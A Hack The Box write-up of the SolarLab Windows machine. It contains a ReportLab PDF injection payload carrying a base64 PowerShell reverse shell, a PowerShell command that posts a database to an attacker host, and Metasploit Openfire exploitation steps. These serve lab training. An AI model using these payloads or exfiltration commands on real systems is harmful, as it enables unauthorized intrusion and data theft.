---
date: 2024-05-18
title: Hack The Box — Solarlab
categories:
  - Writeups
  - HTB
  - CTF
tags:
  - smb
  - os_command_injection
  - proxychains
  - openfire
  - windows
media_subpath: /assets/images
image: solarlab.png
---
# TL;DR

The HackTheBox machine "SolarLab" is a medium-difficulty Windows box featuring a vulnerable ReportLab PDF generation system and an Openfire server with an authentication bypass vulnerability (CVE-2023-32315). Initial enumeration revealed two HTTP services (ports 80 and 6791) and SMB (port 445). Credentials were obtained from an SMB share (`details-file.xlsx`), allowing access to `report.solarlab.htb:6791`. A command injection vulnerability in the PDF generation was exploited to gain a reverse shell as `blake`. Internal enumeration uncovered a local Openfire instance (port 9090) accessible via proxy, which was exploited using CVE-2023-32315 to retrieve the `admin` user’s encrypted password. After decryption, the `admin` credentials were used with `RunasCs` to execute commands as SYSTEM, capturing the root flag.

## Initial Enumeration

### Nmap Scan

Reconnaissance began with a comprehensive Nmap scan to identify open ports, services, and version information on the target (IP: 10.10.11.16).

#### All Ports Scan

```bash
sudo nmap -p- -T 5 10.10.11.16 -oA allports
```

**Results:**

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 11:33 EDT
Nmap scan report for 10.10.11.16
Host is up (0.12s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
6791/tcp open hnm
Nmap done: 1 IP address (1 host up) scanned in 248.59 seconds
```

#### Aggressive Scan

```bash
sudo nmap -p 80,135,139,445,6791 -A 10.10.11.16 -oA aggressive
```

**Results:**

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 11:39 EDT
Nmap scan report for 10.10.11.16
Host is up (0.15s latency).
PORT    STATE SERVICE      VERSION
80/tcp  open  http         nginx 1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
|_http-server-header: nginx/1.24.0
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
6791/tcp open http         nginx 1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
|_http-server-header: nginx/1.24.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-05-17T15:40:02
|_  start_date: N/A
TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   118.90 ms 10.10.14.1
2   197.86 ms 10.10.11.16
Nmap done: 1 IP address (1 host up) scanned in 88.91 seconds
```

**Notes:**

- **HTTP (Port 80)**: Nginx 1.24.0 with a redirect to `http://solarlab.htb/`. Added to `/etc/hosts`:
    
    ```bash
    echo "10.10.11.16 solarlab.htb report.solarlab.htb" >> /etc/hosts
    ```
    
- **HTTP (Port 6791)**: Second nginx 1.24.0 instance redirecting to `http://report.solarlab.htb:6791/`, indicating a subdomain-based application.
- **SMB (Ports 139/445)**: Windows file sharing enabled, with message signing not required, suggesting potential for anonymous access.
- **RPC (Port 135)**: Standard Windows RPC, no immediate vulnerabilities without credentials.
- **HNM (Port 6791)**: Misidentified by Nmap; confirmed as HTTP via manual checks.
- OS detection suggested Windows XP, but SMB2 and nginx suggest a modern Windows Server (likely 2019/2022).

#### UDP Scan for SNMP

An SNMP UDP scan was performed to enumerate additional services:

```bash
nmap -sU -p 161 10.10.11.16
```

![images (26)](images (26).png)

No SNMP services were accessible, so focus shifted to HTTP and SMB.

![images (27)](images (27).png)

---

## SMB Enumeration

### SMBclient

Enumerated SMB shares anonymously:

```bash
smbclient -N -L //solarlab.htb/
```

**Results:**

```bash
Sharename  Type   Comment
---------  ----   -------
ADMIN$     Disk   Remote Admin
C$         Disk   Default share
Documents  Disk
IPC$       IPC    Remote IPC
```

Connected to the `Documents` share:

```bash
smbclient -N //solarlab.htb/Documents
```

**Results:**

```bash
smb: \> ls
.D                             DR     0  Fri Apr 26 10:47:14 2024
..                            DR     0  Fri Apr 26 10:47:14 2024
concepts                      D      0  Fri Apr 26 10:41:57 2024
desktop.ini                   AHS  278  Fri Nov 17 05:54:43 2023
details-file.xlsx             A  12793  Fri Nov 17 07:27:21 2023
My Music                      DHSrn  0  Thu Nov 16 14:36:51 2023
My Pictures                   DHSrn  0  Thu Nov 16 14:36:51 2023
My Videos                     DHSrn  0  Thu Nov 16 14:36:51 2023
old_leave_request_form.docx   A  37194  Fri Nov 17 05:35:57 2023
```

`My Pictures` and `My Videos` returned `NT_STATUS_ACCESS_DENIED`. Downloaded `details-file.xlsx`:

```bash
smb: \> get details-file.xlsx
```

**Contents:**

![images (16)](images (16).png)

![images (18)](images (18).png)

|Site|Account#|Username|Password|Security Question|Answer|Email|Other Information|
|---|---|---|---|---|---|---|---|
|Amazon.com|101-333|[Alexander.knight@gmail.com](mailto:Alexander.knight@gmail.com)|al;ksdhfewoiuh|What was your mother's maiden name?|Blue|[Alexander.knight@gmail.com](mailto:Alexander.knight@gmail.com)||
|Pefcu|A233J|KAlexander|dkjafblkjadsfgl|What was your high school mascot?|Pine Tree|[Alexander.knight@gmail.com](mailto:Alexander.knight@gmail.com)||
|Chase||[Alexander.knight@gmail.com](mailto:Alexander.knight@gmail.com)|d398sadsknr390|What was the name of your first pet?|corvette|[Claudia.springer@gmail.com](mailto:Claudia.springer@gmail.com)||
|Fidelity||blake.byte|ThisCanB3typedeasily1@|What was your mother's maiden name?|Helena|[blake@purdue.edu](mailto:blake@purdue.edu)||
|Signa||AlexanderK|danenacia9234n|What was your mother's maiden name?|Poppyseed muffins|[Alexander.knight@gmail.com](mailto:Alexander.knight@gmail.com)|account number: 1925-47218-30|
|||ClaudiaS|dadsfawe9dafkn|What was your mother's maiden name?|yellow crayon|[Claudia.springer@gmail.com](mailto:Claudia.springer@gmail.com)|account number: 3872-03498-45|

**SSNs:**

- Alexander: 123-23-5424
- Claudia: 820-378-3984
- Blake: 739-1846-436

**Email:** `SKILLSPOOL@WOODGROUP.COM`

Enum4linux was attempted but failed due to restricted access:

```bash
enum4linux solarlab.htb -A -C
```

---
## Web Enumeration

### Port 80 - SolarLab Instant Messenger

The web service on port 80 (`http://solarlab.htb/`) hosted a "SolarLab Instant Messenger" application, identified via WhatWeb:

```bash
whatweb http://solarlab.htb
http://solarlab.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.24.0], IP[10.10.11.16], JQuery[2.1.0], Meta-Author[Jewel Theme], Modernizr[2.8.0.min], Script[text/javascript], Title[SolarLab Instant Messenger], X-UA-Compatible[IE=edge], nginx[1.24.0]
```

![images (14)](images (14).png)

Directory brute-forcing with Dirb:

```bash
dirb http://solarlab.htb /usr/share/wordlists/dirb/common.txt
```

**Results:**

```bash
---- Scanning URL: http://solarlab.htb/ ----
==> DIRECTORY: http://solarlab.htb/assets/
+ http://solarlab.htb/con (CODE:500|SIZE:579)
==> DIRECTORY: http://solarlab.htb/images/
==> DIRECTORY: http://solarlab.htb/Images/
+ http://solarlab.htb/index.html (CODE:200|SIZE:16210)
+ http://solarlab.htb/nul (CODE:500|SIZE:579)
```

Subdomain enumeration with ffuf:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://solarlab.htb -H "Host: FUZZ.solarlab.htb" -fs 169
```

No additional subdomains were found beyond `report.solarlab.htb`. The instant messenger required authentication, and no immediate vulnerabilities were identified.

### Port 6791 - Report System

The web service on port 6791 (`http://report.solarlab.htb:6791/`) hosted a reporting application with a login form and PDF generation functionality.

![images (19)](images (19).png)


#### User Enumeration

![images (22)](images (22).png)

Using Burp Suite Intruder, the login form (`/login`) was tested for user enumeration by sending `POST` requests with usernames from a wordlist:

```http
POST /login HTTP/1.1
Host: report.solarlab.htb:6791
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

username=§username§&password=test
```

![images (23)](images (23).png)

![images (29)](images (29).png)

**Valid Users:**

- AlexanderK
- ClaudiaS
- BlakeB

#### Credential Brute-Forcing

Using the usernames, a cluster bomb attack in Burp Intruder tested passwords from the SMB share’s `details-file.xlsx`. The payload for `BlakeB` succeeded:

```http
POST /login HTTP/1.1
Host: report.solarlab.htb:6791
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
username=BlakeB&password=ThisCanB3typedeasily1@
```

![images (31)](images (31).png)

**Credentials:** `BlakeB:ThisCanB3typedeasily1@`

![images (30)](images (30).png)
#### SQL Injection Testing

Tested for SQL injection using sqlmap:

```bash
sqlmap -r report-login.req -p username --risk 3 --level 5
```

![images (28)](images (28).png)

No vulnerabilities were found, so focus shifted to the PDF generation feature.

---

## Web Exploitation

### Command Injection in ReportLab PDF

Logged into `report.solarlab.htb:6791` as `BlakeB:ThisCanB3typedeasily1@`. The application allowed PDF report generation, powered by ReportLab.

![images (32)](images (32).png)

A command injection vulnerability was identified in the PDF generation due to unsanitized input in the `<font color>` attribute, allowing execution of arbitrary PowerShell commands.

![images (59)](images (59).png)

**Payload:**

```html
<p><font color="[ [ getattr(pow,Word('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgA0ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG1AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
exploit
</font></p>
```

The base64-encoded PowerShell command established a reverse TCP connection to `10.10.16.24:9001`. A listener was set up:

```bash
nc -lvnp 9001
```

![images (12)](images (12).png)

This yielded a shell as `blake`.

---

## Local Enumeration & User Flag

As `blake`, enumerated the filesystem:

```powershell
dir C:\Users\blake\Desktop
```

Retrieved the user flag:

```powershell
type C:\Users\blake\Desktop\user.txt
```

Explored `C:\Users\blake\Downloads`, finding a `users.db` SQLite database:

```powershell
dir C:\Users\blake\Downloads
```

Transferred to the attacker machine:

```bash
powershell -c "Invoke-WebRequest -Uri http://10.10.14.124:8000/users.db -Method POST -InFile C:\Users\blake\Downloads\users.db"
```

Queried the database:

```bash
sqlite3 users.db
.tables
user
select * from user;
1|blakeb|ThisCanB3typedeasily1@
2|claudias|007poiuytrewq
3|alexanderk|HotP!fireguard
```

**Credentials:**

- blakeb:ThisCanB3typedeasily1@
- claudias:007poiuytrewq
- alexanderk:HotP!fireguard

---

## Internal Network Enumeration

### Port Scanning

From the `blake` shell, scanned internal ports:

```powershell
1..65535 | % { Test-NetConnection -ComputerName 127.0.0.1 -Port $_ -InformationLevel Quiet } | ? { $_ } | select ComputerName,RemotePort
```

![images (8)](images (8).png)

![images (7)](images (7).png)

Discovered an Openfire server on `127.0.0.1:9090`, inaccessible externally.

### Proxying with Proxychains

Set up a SOCKS proxy using Meterpreter:

```bash
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run
```

Configured Proxychains:

```bash
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
```

Accessed the Openfire login page:

```bash
proxychains curl http://127.0.0.1:9090/login.jsp?url=%2Findex.jsp
```

![images](images.png)

![images (2)](images (2).png)

![images (1)](images (1).png)

---

## Exploitation of Openfire (CVE-2023-32315)

The Openfire server was vulnerable to CVE-2023-32315, an authentication bypass allowing access to the admin console. Used Metasploit:

```bash
msfconsole
use multi/http/openfire_auth_bypass_rce_cve_2023_32315
set RHOSTS 127.0.0.1
set RPORT 9090
set LHOST tun0
run
```

![images (6)](images (6).png)

Extracted the Openfire database (`OFUSER` table):

```sql
CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e'
ALTER USER SA SET LOCAL TRUE
CREATE SCHEMA PUBLIC AUTHORIZATION DBA
SET SCHEMA PUBLIC
CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
```

**Credentials:**

|Username|Stored Key|Server Key|Salt|Iterations|Plain Password|Encrypted Password|Name|Email|
|---|---|---|---|---|---|---|---|---|
|admin|gjMoswpK+HakPdvLIvp6eLKlYh0=|9MwNQcJ9bF4YeyZDdns5gvXp620=|yidQk5Skw11QJWTBAloAb28lYHftqa0x|4096|null|becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442|Administrator|[admin@solarlab.htb](mailto:admin@solarlab.htb)|

Decrypted the password using the Openfire Password Decryptor:

```bash
git clone https://github.com/MattiaCossu/Openfire-Password-Decryptor
cd Openfire-Password-Decryptor
pip3 install -r requirements.txt
python3 main.py -p becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 -k hGXiFzsKaAeYLjn
```

**Result:** `admin:ThisPasswordShouldDo!@`

---

## Privilege Escalation

Initial privilege escalation attempts using Metasploit’s `local_exploit_suggester` failed:

```bash
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 10.10.11.16 - Valid modules for session 1:
============================
 # Name                                    Potentially Vulnerable?  Check Result
 - ----                                    -----------------------  ------------
 1 exploit/windows/local/bypassuac_dotnet_profiler  Yes              The target appears to be vulnerable.
 2 exploit/windows/local/bypassuac_fodhelper        Yes              The target appears to be vulnerable.
 3 exploit/windows/local/bypassuac_sdclt            Yes              The target appears to be vulnerable.
 4 exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes  The service is running, but could not be validated.
 5 exploit/windows/local/win_error_cve_2023_36874  Yes              The target appears to be vulnerable.
```

Using `RunasCs` with the `admin` credentials:

```powershell
RunasCs.exe administrator ThisPasswordShouldDo!@ "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```

This executed a command as `administrator`, retrieving the root flag.

---

## Summary

|Step|Description|
|---|---|
|Enumeration|Nmap identified HTTP (80, 6791), SMB (445), and RPC (135). Added `solarlab.htb` and `report.solarlab.htb` to `/etc/hosts`.|
|SMB Recon|Anonymous access to `Documents` share revealed `details-file.xlsx` with credentials (`BlakeB:ThisCanB3typedeasily1@`).|
|Web Recon (6791)|Logged into `report.solarlab.htb:6791` and found command injection in ReportLab PDF generation.|
|Initial Shell|Injected PowerShell reverse shell via PDF exploit, gaining `blake` access. Retrieved user flag.|
|Internal Enumeration|Found `users.db` with credentials and Openfire on `127.0.0.1:9090` via internal port scan.|
|Openfire Exploit|Exploited CVE-2023-32315 to access Openfire admin console, retrieved and decrypted `admin:ThisPasswordShouldDo!@`.|
|Privilege Escalation|Used `RunasCs` with `admin` credentials to execute commands as SYSTEM, capturing root flag.|